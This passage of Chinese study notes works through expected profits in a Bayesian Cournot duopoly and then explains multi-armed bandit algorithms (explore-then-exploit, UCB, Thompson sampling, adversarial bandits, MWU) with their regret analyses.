<li>厂商 2 的期望类型为：<span class="arithmatex">\(E[\theta_2] = \frac{1}{2} \cdot \frac{5}{4} + \frac{1}{2} \cdot \frac{3}{4} = 1\)</span></li>
<li>厂商 1 的类型为：<span class="arithmatex">\(\theta_1 = 1\)</span></li>
</ul>
<p>博弈退化为一个标准的对称古诺竞争，双方的利润函数为 <span class="arithmatex">\(u_i = q_i(1 - q_i - q_j)\)</span>。</p>
<ul>
<li>
<p><strong>求解均衡产量</strong>:
    双方的最优反应函数为 <span class="arithmatex">\(q_i^* = (1 - q_j)/2\)</span>。联立求解可得：</p>
<div class="arithmatex">\[
     q_1^* = q_2^* = \frac{1}{3} 
\]</div>
</li>
<li>
<p><strong>计算利润</strong>:</p>
<div class="arithmatex">\[
     u_1 = u_2 = \frac{1}{3} \left(1 - \frac{1}{3} - \frac{1}{3}\right) = \left(\frac{1}{3}\right)^2 = \frac{1}{9} 
\]</div>
</li>
</ul>
<p>这与表格第一行的数据相符。</p>
<hr />
<p>只有厂商 2 知道 (非对称信息)</p>
<p>这就是我们之前求解的标准贝叶斯纳什均衡情景。</p>
<ul>
<li>
<p><strong>均衡产量</strong>:</p>
<div class="arithmatex">\[ 
    q_1^* = \frac{1}{3}, \quad q_2^L = \frac{11}{24} \text{ (低成本)}, \quad q_2^H = \frac{5}{24} \text{ (高成本)} 
\]</div>
</li>
<li>
<p><strong>计算厂商 1 的期望利润</strong>:
    厂商 1 不知道对手是哪种类型，因此其利润是期望值：</p>
<div class="arithmatex">\[ 
    E[u_1] = \frac{1}{2} q_1^*(1 - q_1^* - q_2^L) + \frac{1}{2} q_1^*(1 - q_1^* - q_2^H) 
\]</div>
<div class="arithmatex">\[ 
    = \frac{1}{2} \cdot \frac{1}{3} \left(1 - \frac{1}{3} - \frac{11}{24}\right) + \frac{1}{2} \cdot \frac{1}{3} \left(1 - \frac{1}{3} - \frac{5}{24}\right) = \frac{1}{2} \cdot \frac{5}{72} + \frac{1}{2} \cdot \frac{11}{72} = \frac{16}{144} = \frac{1}{9} 
\]</div>
<p>实际上也可以用<span class="arithmatex">\(u_i=q_i^2\)</span>(用一阶导为0来推导)来直接计算得到 1/9</p>
</li>
<li>
<p><strong>计算厂商 2 的期望利润</strong>:
    厂商 2 知道自己的类型，其期望利润是在它知道自己类型前的期望：</p>
<div class="arithmatex">\[ 
    E[u_2] = \frac{1}{2} u_2(q_2^L; \theta_2=\frac{5}{4}) + \frac{1}{2} u_2(q_2^H; \theta_2=\frac{3}{4}) 
\]</div>
<p>由于 <span class="arithmatex">\(u_i=q_i^2\)</span> 在均衡时成立，我们有：</p>
<div class="arithmatex">\[
     E[u_2] = \frac{1}{2} (q_2^L)^2 + \frac{1}{2} (q_2^H)^2 = \frac{1}{2} \left(\frac{11}{24}\right)^2 + \frac{1}{2} \left(\frac{5}{24}\right)^2 = \frac{1}{2} \frac{121+25}{576} = \frac{73}{576} \approx 0.1267 
\]</div>
</li>
</ul>
<p>这与表格第二行的数据相符。</p>
<hr />
<p>Case 3: 两个厂商都知道 (完全信息)</p>
<p>在这种情况下，信息是完全的。博弈分为两种可能的情况，每种情况发生概率为 &frac12;。我们需要分别求解，然后计算期望利润。</p>
<ul>
<li>
<p><strong>情况 A (厂商 2 为低成本, <span class="arithmatex">\(\theta_2 = 5/4\)</span>)</strong>:</p>
<ul>
<li>求解古诺均衡得：<span class="arithmatex">\(q_1^A = 1/4, q_2^A = 1/2\)</span></li>
<li>利润为：<span class="arithmatex">\(u_1^A = (1/4)^2 = 1/16\)</span>, <span class="arithmatex">\(u_2^A = (1/2)^2 = 1/4\)</span></li>
</ul>
</li>
<li>
<p><strong>情况 B (厂商 2 为高成本, <span class="arithmatex">\(\theta_2 = 3/4\)</span>)</strong>:</p>
<ul>
<li>求解古诺均衡得：<span class="arithmatex">\(q_1^B = 5/12, q_2^B = 1/6\)</span></li>
<li>利润为：<span class="arithmatex">\(u_1^B = (5/12)^2 = 25/144\)</span>, <span class="arithmatex">\(u_2^B = (1/6)^2 = 1/36\)</span></li>
</ul>
</li>
<li>
<p><strong>计算期望利润</strong>:</p>
<ul>
<li>
<p><strong>厂商 1</strong>: </p>
<div class="arithmatex">\[ 
    E[u_1] = \frac{1}{2} u_1^A + \frac{1}{2} u_1^B = \frac{1}{2} \left(\frac{1}{16} + \frac{25}{144}\right) = \frac{1}{2} \left(\frac{9}{144} + \frac{25}{144}\right) = \frac{17}{144} 
\]</div>
</li>
<li>
<p><strong>厂商 2</strong>:</p>
<div class="arithmatex">\[ 
    E[u_2] = \frac{1}{2} u_2^A + \frac{1}{2} u_2^B = \frac{1}{2} \left(\frac{1}{4} + \frac{1}{36}\right) = \frac{1}{2} \left(\frac{9}{36} + \frac{1}{36}\right) = \frac{10}{72} = \frac{5}{36} 
\]</div>
</li>
</ul>
</li>
</ul>
<p>厂商 2 的利润 <span class="arithmatex">\(5/36 \approx 0.139\)</span> 与表格第三行的数据相符。</p>
</div></section><section class="print-page" id="note-datamarket-mab" heading-number="2.2.5.3"><h1 id="note-datamarket-mab-multi-armed-bandit">多臂老虎机 (Multi-Armed Bandit)<a class="headerlink" href="#note-datamarket-mab-multi-armed-bandit" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 4574 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 13 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 16 分钟</p>
</div>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>一个赌鬼要玩多臂老虎机，摆在他面前有 <span class="arithmatex">\(K\)</span> 个臂（Arms）或动作选择（Actions），每一轮游戏中，他要选择拉动一个臂并会获得一个随机奖励（reward）（这一随机奖励来源于一个赌场设定好的分布，但赌鬼一开始不知道这一分布）。如果总共玩 <span class="arithmatex">\(T\)</span> 轮，他该如何最大化奖励</p>
<p><figure markdown="span">
    <img alt="Multi-Armed Bandit" src="../NOTE/DataMarket/img/mab.png" />
    <figcaption>多臂老虎机</figcaption>
</figure></p>
</div>
<h2 id="note-datamarket-mab-_1">随机多臂老虎机<a class="headerlink" href="#note-datamarket-mab-_1" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">随机多臂老虎机</p>
<p>在每一步 <span class="arithmatex">\(t=1,2,\ldots,T\)</span> 中：</p>
<ol>
<li>玩家选择一个臂 <span class="arithmatex">\(a_t \in A = \{a_1, \ldots, a_K\}\)</span>；</li>
<li>玩家获得该臂对应的随机奖励 <span class="arithmatex">\(r_t \sim R(a_t)\)</span>（<span class="arithmatex">\(r_t \in [0,1]\)</span>）；</li>
<li>玩家依据过往轮次的奖励情况调整选择策略，实现奖励最大化。</li>
</ol>
<p>说明：</p>
<ul>
<li>奖励分布的均值记为 <span class="arithmatex">\(\mu(a_k) = \mathbb{E}[R(a_k)]\)</span>，<span class="arithmatex">\(k \in [K]\)</span>；</li>
<li>最优臂 <span class="arithmatex">\(a^*\)</span> 的奖励均值 <span class="arithmatex">\(\mu^* = \max_{a \in A} \mu(a)\)</span>；</li>
<li>奖励均值差异 <span class="arithmatex">\(\Delta(a) = \mu^* - \mu(a)\)</span>。</li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>奖励均值差异和奖励均值是未知的，玩家需要通过探索来估计这些值。定义这些值是为了在上帝视角分析算法的性能。</p>
</div>
</div>
<p>遗憾分析</p>
<mark class="critic block">
<p>伪遗憾</p>
<div class="arithmatex">\[
    \text{伪遗憾} = \sum_{t=1}^T \left( \mu^* - \mu(a_t) \right) = \mu^*T - \sum_{t=1}^T \mu(a_t)
\]</div>
<p>期望遗憾</p>
<div class="arithmatex">\[
    \text{期望遗憾} = \mathbb{E}[\text{伪遗憾}] = \mu^*T - \mathbb{E}[\sum_{t=1}^T \mu(a_t)]
\]</div>
</mark>
<p>由于选择策略的随机性，<span class="arithmatex">\(\mu(a_t)\)</span> 是随机变量。</p>
<div class="admonition info">
<p class="admonition-title">次线性</p>
<p>一个函数 <span class="arithmatex">\(f(x)\)</span> 是次线性的，如果对于所有 <span class="arithmatex">\(x\)</span>，有 <span class="arithmatex">\(f(x) \leqslant cx\)</span> 成立，其中 <span class="arithmatex">\(c\)</span> 是一个常数。</p>
<p>在MAB问题中，我们常常关注算法遗憾界（regret bound）。一个好的遗憾界是次线性的（sub-linear），这意味着算法能逐渐学到最优臂，即</p>
<div class="arithmatex">\[
    \lim_{T \to \infty} \frac{RegretBound(T)}{T} = 0
\]</div>
</div>
<div class="admonition note">
<p class="admonition-title">Hoeffding不等式</p>
<p>设 <span class="arithmatex">\(X_1, X_2, \ldots, X_n\)</span> 是独立同分布的随机变量，且 <span class="arithmatex">\(X_i \in [0,1]\)</span>。则对于任意 <span class="arithmatex">\(\epsilon &gt; 0\)</span>，有</p>
<div class="arithmatex">\[
    \mathbb{P}\left( \left| \frac{1}{n} \sum_{i=1}^n X_i - \mathbb{E}[X_i] \right| \geqslant \epsilon \right) \leqslant 2e^{-2n\epsilon^2}
\]</div>
<p>称 <span class="arithmatex">\([\mu - \epsilon, \mu + \epsilon]\)</span> 是置信区间（confidence interval），<span class="arithmatex">\(\epsilon\)</span> 是置信半径（confidence radius）。</p>
<p>若令 <span class="arithmatex">\(\epsilon = \sqrt{\frac{\alpha \log T}{n}}\)</span>，则有</p>
<div class="arithmatex">\[
    \mathbb{P}(|\mu - \overline{X}_n| \geqslant \epsilon) = \mathbb{P}\left( \left| \mu - \overline{X}_n \right| \geqslant \sqrt{\frac{\alpha \log T}{n}} \right) \leqslant 2T^{-2\alpha}, \forall \alpha &gt; 0
\]</div>
<p>一般取 <span class="arithmatex">\(\alpha = 2\)</span></p>
</div>
<h3 id="note-datamarket-mab-_2">贪心算法<a class="headerlink" href="#note-datamarket-mab-_2" title="Permanent link">&para;</a></h3>
<figure>
    <img alt="贪心算法" src="../NOTE/DataMarket/img/greedy.png" width="500" />
    <figcaption>贪心算法</figcaption>
</figure>
<h4 id="note-datamarket-mab-_3">贪心算法期望遗憾界<a class="headerlink" href="#note-datamarket-mab-_3" title="Permanent link">&para;</a></h4>
<p>贪心算法期望遗憾界为 <span class="arithmatex">\(O\left(T^{\frac{2}{3}}(K\log T)^{\frac{1}{3}}\right)\)</span>。</p>
<p>分析框架：好事件 vs. 坏事件</p>
<p>我们将利用阶段的期望遗憾 <span class="arithmatex">\(\mathbb{E}[R(\text{exploitation})]\)</span> 分解为两部分：</p>
<div class="arithmatex">\[
\mathbb{E}[R] = \mathbb{E}[R | E] \cdot P(E) + \mathbb{E}[R | \bar{E}] \cdot P(\bar{E})
\]</div>
<ul>
<li>
<p><strong>事件 <span class="arithmatex">\(E\)</span> (好事件)</strong>: 我们的采样估计是"准确"的。具体来说，所有臂 <span class="arithmatex">\(a\)</span> 的样本均值 <span class="arithmatex">\(Q(a)\)</span> 与其真实均值 <span class="arithmatex">\(\mu(a)\)</span> 的差距都小于某个范围 <span class="arithmatex">\(\text{rad}\)</span>。
    $$ E = { \forall a, |\mu(a) - Q(a)| \le \text{rad} } $$
    其中我们定义 <span class="arithmatex">\(\text{rad}\)</span> 为 <span class="arithmatex">\(\sqrt{\frac{2\log T}{N}}\)</span>。</p>
</li>
<li>
<p><strong>事件 <span class="arithmatex">\(\bar{E}\)</span> (坏事件)</strong>: 事件 <span class="arithmatex">\(E\)</span> 的补集，即至少有一个臂的采样估计"不准确"，超出了 <span class="arithmatex">\(\text{rad}\)</span> 的范围。</p>
</li>
</ul>
<p>分析坏事件 <span class="arithmatex">\(\bar{E}\)</span> 的贡献</p>
<p>根据霍夫丁不等式和联合界，坏事件发生的概率 <span class="arithmatex">\(P(\bar{E})\)</span> 极小：</p>
<div class="arithmatex">\[
    P(\bar{E}) \le \sum_{a=1}^K P(|\mu(a) - Q(a)| &gt; \text{rad}) \le \sum_{a=1}^K 2e^{-2N(\text{rad})^2} = \sum_{a=1}^K 2e^{-4\log T} = 2K T^{-4} 
\]</div>
<p>在坏事件中，最坏情况下的遗憾为 <span class="arithmatex">\(T\)</span>。因此，这部分对总遗憾的贡献可以忽略不计：</p>
<div class="arithmatex">\[
    \mathbb{E}[R | \bar{E}] \cdot P(\bar{E}) \le T \cdot O(K T^{-4}) = O(K T^{-3}) 
\]</div>
<p>分析好事件 <span class="arithmatex">\(E\)</span> 的贡献</p>
<p>假设我们处在"好事件" <span class="arithmatex">\(E\)</span> 中，即 <span class="arithmatex">\(|\mu(a) - Q(a)| \le \text{rad}\)</span> 对所有臂都成立。
只有当我们选错了臂（即选择了次优臂 <span class="arithmatex">\(a\)</span> 而非最优臂 <span class="arithmatex">\(a^*\)</span>)时，才会产生遗憾。这种情况发生的条件是 <span class="arithmatex">\(Q(a) &gt; Q(a^*)\)</span>。
利用好事件的定义，我们可以推导出一系列不等式：</p>
<div class="arithmatex">\[
    \mu(a) + \text{rad} \ge Q(a) &gt; Q(a^*) \ge \mu(a^*) - \text{rad} 
\]</div>
<p>整理上式可得，单步遗憾的上界为：</p>
<div class="arithmatex">\[
    \Delta_a = \mu(a^*) - \mu(a) &lt; 2 \cdot \text{rad} 
\]</div>
<p>这意味着，在好事件中，即便我们选错了，这个次优臂也不会太差。因此，利用阶段的总遗憾上
界为：</p>
<div class="arithmatex">\[
    \mathbb{E}[R(\text{exploitation}) | E] \le (T - KN) \cdot (2 \cdot \text{rad}) 
\]</div>
<p>综合与优化</p>
<p>将所有部分的遗憾相加，我们得到总期望遗憾 <span class="arithmatex">\(R(T)\)</span> 的上界：</p>
<div class="arithmatex">\[
    \mathbb{E}[R(T)] \lesssim \underbrace{(K-1)N}_{\text{探索遗憾}} + \underbrace{(T - KN) \cdot (2 \cdot \text{rad})}_{\text{利用遗憾}} + \underbrace{O(K T^{-3})}_{\text{可忽略}} 
\]</div>
<p>代入 <span class="arithmatex">\(\text{rad}\)</span> 的定义，并忽略一些小项：</p>
<div class="arithmatex">\[
    \mathbb{E}[R(T)] \lesssim KN + 2T \sqrt{\frac{2\log T}{N}} 
\]</div>
<p>为了最小化这个上界，我们需要平衡探索成本（随 <span class="arithmatex">\(N\)</span> 增加）和利用遗憾（随 <span class="arithmatex">\(N\)</span> 减小）。我们令两项的量级相等来找到最优的 <span class="arithmatex">\(N\)</span>：</p>
<div class="arithmatex">\[
    KN \approx T\sqrt{\frac{\log T}{N}} \implies N^{3/2} \approx \frac{T\sqrt{\log T}}{K} \implies N \approx \left(\frac{T\sqrt{\log T}}{K}\right)^{2/3} 
\]</div>
<p>将这个最优的 <span class="arithmatex">\(N\)</span> 代回遗憾表达式 <span class="arithmatex">\(KN\)</span> 中：</p>
<div class="arithmatex">\[
    \mathbb{E}[R(T)] \approx K \cdot \left(\frac{T\sqrt{\log T}}{K}\right)^{2/3} = K \cdot \frac{T^{2/3}(\log T)^{1/3}}{K^{2/3}} = K^{1/3}T^{2/3}(\log T)^{1/3} 
\]</div>
<p>最终得到遗憾界为：</p>
<div class="arithmatex">\[
    \mathbb{E}[R(T)] = O\left(T^{\frac{2}{3}}(K\log T)^{\frac{1}{3}}\right) 
\]</div>
<div class="admonition info">
<p class="admonition-title"><span class="arithmatex">\(\epsilon\)</span>-贪心算法</p>
<p><figure markdown="span">
    <img alt="\(\epsilon\)-贪心算法" src="../NOTE/DataMarket/img/epsilon-greedy.png" width="500" />
    <figcaption><span class="arithmatex">\(\epsilon\)</span>-贪心算法</figcaption>
</figure></p>
</div>
<h3 id="note-datamarket-mab-_4">上置信界算法<a class="headerlink" href="#note-datamarket-mab-_4" title="Permanent link">&para;</a></h3>
<figure>
    <img alt="" src="../NOTE/DataMarket/img/UCB1.png" />
    <img alt="" src="../NOTE/DataMarket/img/UCB2.png" />
</figure>
<p>UCB算法期望遗憾界为 <span class="arithmatex">\(O\left(\sqrt{KT\log T}\right)\)</span>。</p>
<h3 id="note-datamarket-mab-_5">汤普森采样算法<a class="headerlink" href="#note-datamarket-mab-_5" title="Permanent link">&para;</a></h3>
<p>汤普森采样采用贝叶斯方法来解决探索-利用困境。其核心思想是为每一个臂（选项）维护一个关于其奖励概率的"信念"，这个"信念"通过一个概率分布来表示。</p>
<p>在做决策时，算法并不是直接选择当前看起来最好的臂，而是**为每个臂的"信念"分布进行一次采样**，然后选择被采样出最高值的那个臂。</p>
<ul>
<li>
<p><strong>探索</strong> ：如果一个臂的"信念"分布很宽（意味着不确定性很高），那么它既有可能被采样出很高的值（从而被选中去探索），也有可能被采样出很低的值。</p>
</li>
<li>
<p><strong>利用</strong> ：如果一个臂被选择了很多次，其"信念"分布会变得很窄，集中在其真实的奖励概率附近。如果这个概率很高，那么每次采样出的值都会很高，从而被稳定地利用。</p>
</li>
</ul>
<p>在获得奖励后，算法会根据奖励结果更新被选择臂的"信念"分布，使其更接近真实情况。</p>
<p>具体而言，汤普森采样算法通常使用 **Beta 分布**来作为每个臂的奖励概率的信念分布。这在奖励为二元（成功/失败，即伯努利试验）的场景下尤其方便。</p>
<div class="admonition info">
<p class="admonition-title">算法流程</p>
<ul>
<li><strong>Beta 分布</strong>:<ul>
<li>我们使用 Beta 分布 <span class="arithmatex">\(\text{Beta}(\alpha, \beta)\)</span> 来为每个臂的成功概率建模。</li>
<li>参数 <span class="arithmatex">\(\alpha\)</span> 和 <span class="arithmatex">\(\beta\)</span> 可以直观地理解为观测到的 <strong>成功次数</strong> 和 <strong>失败次数</strong> 。</li>
</ul>
</li>
<li>
<p>当 <span class="arithmatex">\(\alpha\)</span> 增大时，分布的质量会向 1 集中；当 <span class="arithmatex">\(\beta\)</span> 增大时，分布会向 0 集中。</p>
</li>
<li>
<p><strong>算法流程</strong>:</p>
<ol>
<li><strong>初始化</strong>: 为每个选项 <span class="arithmatex">\(k\)</span>，初始化其成功次数 <span class="arithmatex">\(S(a_k) = 0\)</span> 和失败次数 <span class="arithmatex">\(F(a_k) = 0\)</span>。</li>
<li><strong>循环</strong>: 在每一轮 <span class="arithmatex">\(t = 1, \dots, T\)</span> 中：
    a. <strong>采样</strong>: 对每个臂 <span class="arithmatex">\(k\)</span>，从其当前的信念分布 <span class="arithmatex">\(\text{Beta}(S(a_k) + 1, F(a_k) + 1)\)</span> 中采样一个随机值 <span class="arithmatex">\(\theta_k\)</span>。
    b. <strong>选择</strong>: 选择本轮采样值 <span class="arithmatex">\(\theta\)</span> 最高的臂 <span class="arithmatex">\(a_t = \underset{k}{\operatorname{argmax}}(\theta_k)\)</span>。
    c. <strong>执行与更新</strong>: 拉动臂 <span class="arithmatex">\(a_t\)</span>，观察奖励 <span class="arithmatex">\(r_t\)</span>。<ul>
<li>如果成功 (<span class="arithmatex">\(r_t = 1\)</span>)，则更新该臂的成功计数：<span class="arithmatex">\(S(a_t) \leftarrow S(a_t) + 1\)</span>。</li>
<li>如果失败 (<span class="arithmatex">\(r_t = 0\)</span>)，则更新该臂的失败计数：<span class="arithmatex">\(F(a_t) \leftarrow F(a_t) + 1\)</span>。</li>
</ul>
</li>
</ol>
</li>
</ul>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DataMarket/img/ts.png" width="500" />
</figure></p>
<p>这个过程会不断重复，通过贝叶斯更新，每个臂的 Beta 分布会越来越准确地反映其真实的成功概率，从而使得算法能更快地收敛到最优臂。</p>
</div>
<div class="admonition question">
<p class="admonition-title">Question</p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DataMarket/img/ts-question.png" width="500" />
</figure>
Beta分布经过更新<span class="arithmatex">\(\alpha\)</span>和<span class="arithmatex">\(\beta\)</span>后仍然是Beta分布。</p>
</div>
<h2 id="note-datamarket-mab-_6">对抗性多臂老虎机<a class="headerlink" href="#note-datamarket-mab-_6" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">对抗性多臂老虎机</p>
<p>对抗性多臂老虎机（Adversarial MAB）问题是多臂老虎机（MAB）问题的一种变体。
与随机多臂老虎机问题不同，对抗性多臂老虎机中的奖励（或代价）是由对手动态生成的，而不是从固定的奖励分布中随机抽取的。对手可能会根据玩家的策略进行调整，从而形成对抗性。其基本模型如下：
在每一步 <span class="arithmatex">\(t=1,2,\dots,T\)</span> 中：</p>
<ol>
<li>玩家在行动集合 <span class="arithmatex">\([n]=\{1,\dots,n\}\)</span> 上选择一个概率分布 <span class="arithmatex">\(p_t\)</span>；</li>
<li>对手在已知 <span class="arithmatex">\(p_t\)</span> 的情况下选择一个代价向量 <span class="arithmatex">\(c_t\in[0,1]^n\)</span>，为每个行动分配一个代价；</li>
<li>玩家根据概率分布 <span class="arithmatex">\(p_t\)</span> 选择一个行动 <span class="arithmatex">\(i_t\)</span>，并观察到该行动的代价 <span class="arithmatex">\(c_t(i_t)\)</span>；</li>
<li>玩家学习整个代价向量 <span class="arithmatex">\(c_t\)</span>，以调整未来的策略。</li>
</ol>
<p>注：</p>
<ol>
<li>玩家的目标是选择一个策略序列 <span class="arithmatex">\(p_1,p_2,\dots,p_T\)</span>，使得总代价最小化（相对于奖励最大化），即最小化期望代价 <span class="arithmatex">\(\mathbb{E}_{i_t\sim p_t} \left[\sum_{t=1}^{T} c_t(i_t)\right]\)</span>。</li>
<li>对手不一定真实存在，这只是一个最坏情况分析；</li>
<li>在这种情况下，玩家不仅能学习到所选行动的代价，还能学习到所有行动的代价，因此这是一个全反馈的情境，与之前的情况不同。</li>
</ol>
<details class="idea" open="open">
<summary>通俗的解释</summary>
<p>你面前有一排老虎机。每台机器的中奖概率是固定的，但你不知道具体是多少。你的任务是通过不断尝试，尽快找出哪台机器最好（中奖概率最高），然后一直玩那台。这就像是在和一个"诚实但守口如瓶"的赌场老板玩，规则是固定的，只是你不知道而已。
现在，我们来看看对抗性多臂老虎机：
这次，你面对的不再是固定的机器，而是一个"狡猾的"赌场老板。这个老板知道你心里在想什么。</p>
<ul>
<li>不再有固定的"最佳选择"：与之前不同，这里没有哪一台机器是永远最好的。老板会每一轮都重新设置所有机器的"代价"（你可以理解为玩一次要花的钱，或者奖励的反面）。</li>
<li>对手知道你的策略：在你出手之前，你可能会想好一个策略，比如"我今天有70%的可能去玩1号机，30%的可能去玩2号机"。这个狡猾的老板能看穿你的策略。</li>
<li>对手会针对你：老板看到你今天大概率要玩1号机，他就会立刻把1号机的代价调得非常高，让你付出惨重代价。同时，他可能会把你基本不考虑的那些机器的代价调得很低。</li>
<li>"事后诸葛亮"：在你玩完一把之后（比如你按计划玩了1号机，付出了高昂代价），老板会把所有机器这一轮的代价都告诉你。你会发现，果然你没选的那些机器代价都很低。这个"事后全盘信息"（在模型里叫 full feedback）是这个模型的一个关键特点，能帮助你调整下一轮的策略。</li>
</ul>
</details>
</div>
<h3 id="note-datamarket-mab-_7">遗憾的定义<a class="headerlink" href="#note-datamarket-mab-_7" title="Permanent link">&para;</a></h3>
<p>第一种遗憾定义的想法是，与所有轮次结束后（每一轮的成本都已知）的事后最优作差，然而下面的例子表明这一定义是不合理的</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>设行动集合为 <span class="arithmatex">\(\{1,2\}\)</span>，在每一轮 <span class="arithmatex">\(t\)</span>，对手按如下步骤选择代价向量：假设算法选择一个概率分布 <span class="arithmatex">\(p_t\)</span>，如果在此分布下选择行动 1 的概率至少为 <span class="arithmatex">\(\frac{1}{2}\)</span>，那么 <span class="arithmatex">\(c_t = (1,0)\)</span>，反之 <span class="arithmatex">\(c_t = (0,1)\)</span>。在此情况下，在线算法期望代价至少为 <span class="arithmatex">\(\frac{T}{2}\)</span>，而在事先知晓代价向量的情况下，最优算法的期望代价为 0。 </p>
<p>这一例子表明，与事后最优比较可能出现线性级别的遗憾，因此这一基准太强了。因此转而将遗憾定义为在线算法与最优固定行动事后代价之差。</p>
</div>
<div class="admonition definition">
<p class="admonition-title">遗憾的定义</p>
<p>固定代价向量 <span class="arithmatex">\(c_1, c_2, \ldots, c_T\)</span>，决策序列 <span class="arithmatex">\(p_1, p_2, \ldots, p_T\)</span> 的遗憾为</p>
<div class="arithmatex">\[
R_T = \mathbb{E}_{i_t \sim p_t} \left[ \sum_{t=1}^{T} c_t(i_t) \right] - \min_{i \in [n]} \sum_{t=1}^{T} c_t(i).
\]</div>
<p>即遗憾被定义为和每轮都选择同一行动的最优的固定行动的代价之差，这样的定义相对而言更加合理：</p>
<ul>
<li>在前面的例子中，固定策略序列（全选 0 或 1）的遗憾不再是简单的 0；</li>
<li>平均遗憾：<span class="arithmatex">\(\frac{R_T}{T}\)</span>。若 <span class="arithmatex">\(T \to \infty\)</span>，<span class="arithmatex">\(R_T = o(T)\)</span>，则称算法是无遗憾（no-regret）的，等价的即 <span class="arithmatex">\(R_T\)</span> 关于 <span class="arithmatex">\(T\)</span> 是次线性的；</li>
<li>这一定义的合理在于，有自然的算法实现无遗憾，但无悔的实现也不是平凡的。</li>
</ul>
</div>
<h3 id="note-datamarket-mab-_8">跟风算法<a class="headerlink" href="#note-datamarket-mab-_8" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">跟风算法</p>
<p>跟风算法指在每一个时间点<span class="arithmatex">\(t\)</span>，选择最小累积代价</p>
<div class="arithmatex">\[
    \sum_{s=1}^{t-1} c_s(i)
\]</div>
<p>的行动<span class="arithmatex">\(i\)</span>。</p>
</div>
<figure>
    <img alt="" src="../NOTE/DataMarket/img/FTL.png" width="500" />
    <figcaption>FTL算法不是无悔的</figcaption>
</figure>
<div class="admonition info">
<p class="admonition-title">随机化是无悔的必要条件</p>
<p>若算法是无悔的，则策略是随机化的，只需要证明若策略是确定性的，则算法不是无悔的。</p>
<p>对于确定性算法，对手可以直接推断出我们的行为，从而在每一步设置我们选择的行为代价为1，其它代价为0；</p>
<p>这样，总代价为<span class="arithmatex">\(T\)</span>，而最优固定行动的代价不会超过<span class="arithmatex">\(\dfrac{T}{n}\)</span>，因此遗憾为<span class="arithmatex">\(1-\dfrac{1}{n}\)</span>，不是无悔的。</p>
<p>如果采用随机策略，则对手只能推断出我们的概率分布 <span class="arithmatex">\(p_t\)</span>，而不能推断出我们的具体行动 <span class="arithmatex">\(i_t \sim p_t\)</span>，因此对手无法完美利用我们的算法。</p>
</div>
<h3 id="note-datamarket-mab-mwu">MWU算法<a class="headerlink" href="#note-datamarket-mab-mwu" title="Permanent link">&para;</a></h3>
<div class="admonition quote">
<p class="admonition-title">引入</p>
<p>考虑一个简化的在线学习场景，每个行动的代价之可能为 0 或 1，并且存在一个完美的行动，其代价永远为 0（但玩家一开始不知道哪个是完美行动），是否存在次线性遗憾的算法？</p>
<p>观察：只要一个行动出现了非零代价，那就可以永远排除它，但我们并不知道剩余行动中哪个最好；
可以设计算法如下：对每一步 <span class="arithmatex">\(t=1,2,\dots,T\)</span>，记录截至目前从没出现过代价 1 的行动，然后在这些行动中根据均匀分布随机选择一个行动。</p>
<p>对于任意 <span class="arithmatex">\(\epsilon \in (0, 1)\)</span>，下面两种情况之一一定会发生：</p>
<ul>
<li><span class="arithmatex">\(S_{\text{good}}\)</span> 中至少 <span class="arithmatex">\(\epsilon k\)</span> 个行动有代价 1，此时这一阶段的期望代价至多为 <span class="arithmatex">\(\epsilon\)</span>(均匀分布，每个行动的概率为<span class="arithmatex">\(\dfrac{1}{k}\)</span>，选中<span class="arithmatex">\(\epsilon k\)</span>个行动的概率为<span class="arithmatex">\(\epsilon\)</span>，因此期望代价为<span class="arithmatex">\(\epsilon\)</span>)；</li>
<li><span class="arithmatex">\(S_{\text{good}}\)</span> 中至多 <span class="arithmatex">\(\epsilon k\)</span> 个行动有代价 1，每次出现这一情况时，下一步就可以排除掉至少 <span class="arithmatex">\(\epsilon k\)</span> 个行动，因此这种情况最多出现 <span class="arithmatex">\(\log_{1-\epsilon} \frac{1}{n}\)</span> 次(每一次都只剩下<span class="arithmatex">\(k(1-\epsilon)\)</span>个行动，因此最多出现<span class="arithmatex">\(m\)</span>次,有<span class="arithmatex">\(n(1-\epsilon)^m = 1\)</span>)。</li>
</ul>
<p>因此总的遗憾至多为(放缩后)</p>
<div class="arithmatex">\[
R_T \leqslant T \times \epsilon + \log_{1-\epsilon} \frac{1}{n} = T \epsilon + \frac{\ln n}{-\ln(1-\epsilon)} \leqslant T \epsilon + \frac{\ln n}{\epsilon}
\]</div>
<p>最后的不等号导来源于 <span class="arithmatex">\(-\ln(1-\epsilon) \geq \epsilon (0 &lt; \epsilon &lt; 1)\)</span>。显然当 <span class="arithmatex">\(\epsilon = \sqrt{\frac{\ln n}{T}}\)</span> 时，<span class="arithmatex">\(R_T \leq 2\sqrt{T \ln n}\)</span>，即次线性遗憾。</p>
</div>
